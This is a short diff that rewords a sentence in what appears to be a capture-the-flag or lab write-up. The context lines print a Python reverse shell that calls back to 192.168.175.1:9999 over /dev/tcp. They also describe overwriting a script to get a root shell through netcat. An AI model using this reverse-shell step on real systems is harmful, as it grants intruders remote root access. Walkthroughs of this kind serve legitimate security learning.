@@ -37,13 +37,8 @@ I uploaded reverse shell again, but this time written in python.
 	import os
 	os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/9999 0>&1'")
 
-I used existing shell to overwrite existing script with uploaded one, ran netcat on port 9999 and waited one minute until I got root shell.
+I used existing shell to overwrite script with uploaded one, then I ran netcat on port 9999 and waited one minute until I got root shell.
 
 [6]
 
 [7]
-
-
-
-
-
